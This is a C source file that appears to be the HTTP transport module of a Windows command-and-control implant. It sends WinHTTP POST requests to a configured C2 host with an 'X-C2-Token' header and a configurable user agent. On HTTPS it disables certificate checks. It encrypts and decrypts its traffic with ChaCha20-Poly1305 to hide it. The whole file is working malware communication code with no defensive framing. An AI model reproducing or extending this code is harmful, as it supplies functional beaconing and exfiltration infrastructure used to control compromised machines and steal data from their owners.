#include <windows.h>
#include <winhttp.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#include "http.h"
#include "crypto.h"
#include "config.h"

#define HTTP_BUF_SIZE  (512 * 1024)
#define PATH_BUF_SIZE  512

// ---------------------------------------------------------------------------
// WinHTTP POST — used by both raw and encrypted paths
// ---------------------------------------------------------------------------
static int http_post_winhttp(const char *host, int port, const char *path,
                              const uint8_t *body, int body_len,
                              uint8_t **out_body, int *out_body_len) {
    HINTERNET hSession = NULL;
    HINTERNET hConnect = NULL;
    HINTERNET hRequest = NULL;
    char      headers[512]              = {0};
    uint8_t  *resp                      = NULL;
    int       ret                       = -1;
    DWORD     bytes_available           = 0;
    DWORD     bytes_read                = 0;
    int       total                     = 0;
    DWORD     flags                     = 0;
    wchar_t   wide_host[PATH_BUF_SIZE]  = {0};
    wchar_t   wide_path[PATH_BUF_SIZE]  = {0};
    wchar_t   wide_agent[PATH_BUF_SIZE] = {0};
    wchar_t   wide_headers[512]         = {0};

    *out_body     = NULL;
    *out_body_len = 0;

#if C2_USE_HTTPS
    flags = WINHTTP_FLAG_SECURE;
#endif

    const char *auth_token = C2_AUTH_TOKEN;
    if (auth_token[0] != '\0') {
        snprintf(headers, sizeof(headers),
                 "Host: %s:%d\r\n"
                 "User-Agent: %s\r\n"
                 "X-C2-Token: %s\r\n"
                 "Content-Type: application/octet-stream\r\n"
                 "Connection: close\r\n",
                 host, port, C2_USER_AGENT, auth_token);
    } else {
        snprintf(headers, sizeof(headers),
                 "Host: %s:%d\r\n"
                 "User-Agent: %s\r\n"
                 "Content-Type: application/octet-stream\r\n"
                 "Connection: close\r\n",
                 host, port, C2_USER_AGENT);
    }

    if (!MultiByteToWideChar(CP_UTF8, 0, host,          -1, wide_host,    PATH_BUF_SIZE)) goto cleanup;
    if (!MultiByteToWideChar(CP_UTF8, 0, path,          -1, wide_path,    PATH_BUF_SIZE)) goto cleanup;
    if (!MultiByteToWideChar(CP_UTF8, 0, C2_USER_AGENT, -1, wide_agent,   PATH_BUF_SIZE)) goto cleanup;
    if (!MultiByteToWideChar(CP_UTF8, 0, headers,       -1, wide_headers, 512))            goto cleanup;

    hSession = WinHttpOpen(wide_agent,
                           WINHTTP_ACCESS_TYPE_AUTOMATIC_PROXY,
                           WINHTTP_NO_PROXY_NAME,
                           WINHTTP_NO_PROXY_BYPASS,
                           0);
    if (!hSession) goto cleanup;

    hConnect = WinHttpConnect(hSession, wide_host, (INTERNET_PORT)port, 0);
    if (!hConnect) goto cleanup;

    hRequest = WinHttpOpenRequest(hConnect, L"POST", wide_path, NULL,
                                  WINHTTP_NO_REFERER,
                                  WINHTTP_DEFAULT_ACCEPT_TYPES,
                                  flags);
    if (!hRequest) goto cleanup;

#if C2_USE_HTTPS
    {
        DWORD sec_flags = SECURITY_FLAG_IGNORE_UNKNOWN_CA    |
                          SECURITY_FLAG_IGNORE_CERT_CN_INVALID |
                          SECURITY_FLAG_IGNORE_CERT_DATE_INVALID;
        WinHttpSetOption(hRequest, WINHTTP_OPTION_SECURITY_FLAGS,
                         &sec_flags, sizeof(sec_flags));
    }
#endif

    if (!WinHttpAddRequestHeaders(hRequest, wide_headers, -1L, WINHTTP_ADDREQ_FLAG_ADD))
        goto cleanup;

    if (!WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0,
                            (LPVOID)body, body_len, body_len, 0))
        goto cleanup;

    if (!WinHttpReceiveResponse(hRequest, NULL)) goto cleanup;

    resp = (uint8_t *)malloc(HTTP_BUF_SIZE);
    if (!resp) goto cleanup;

    while (WinHttpQueryDataAvailable(hRequest, &bytes_available) &&
           bytes_available > 0 &&
           total < HTTP_BUF_SIZE - 1) {
        if (bytes_available > (DWORD)(HTTP_BUF_SIZE - 1 - total))
            bytes_available = HTTP_BUF_SIZE - 1 - total;
        if (!WinHttpReadData(hRequest, resp + total, bytes_available, &bytes_read))
            goto cleanup;
        if (bytes_read == 0) break;
        total += (int)bytes_read;
    }

    if (total <= 0) goto cleanup;

    *out_body     = resp;
    *out_body_len = total;
    resp = NULL;
    ret  = 0;

cleanup:
    if (hRequest) WinHttpCloseHandle(hRequest);
    if (hConnect) WinHttpCloseHandle(hConnect);
    if (hSession) WinHttpCloseHandle(hSession);
    free(resp);
    return ret;
}

// ---------------------------------------------------------------------------
// Public API
// ---------------------------------------------------------------------------

int http_post_raw(const char *host, int port, const char *path,
                  const uint8_t *body, int body_len,
                  uint8_t **out_body, int *out_body_len) {
    return http_post_winhttp(host, port, path, body, body_len, out_body, out_body_len);
}

int http_post_encrypted(const char *host, int port, const char *path,
                        const uint8_t *plain_data, int plain_len,
                        uint8_t **out_plain, int *out_plain_len) {
    uint8_t        *enc_body     = NULL;
    uint8_t        *resp         = NULL;
    size_t          enc_len      = 0;
    int             raw_resp_len = 0;
    int             ret          = -1;
    uint8_t         empty[1]     = {0};
    const uint8_t  *payload      = plain_data ? plain_data : empty;

    *out_plain     = NULL;
    *out_plain_len = 0;

    enc_body = chacha20poly1305_encrypt(payload, plain_len, &enc_len);
    if (!enc_body) goto cleanup;

    if (http_post_winhttp(host, port, path, enc_body, (int)enc_len,
                          &resp, &raw_resp_len) != 0)
        goto cleanup;

    if (!resp || raw_resp_len < 12 + 16) goto cleanup;

    size_t   decrypted_len = 0;
    uint8_t *plain = chacha20poly1305_decrypt(resp, (size_t)raw_resp_len, &decrypted_len);
    if (!plain) goto cleanup;

    *out_plain     = plain;
    *out_plain_len = (int)decrypted_len;
    ret = 0;

cleanup:
    free(enc_body);
    free(resp);
    return ret;
}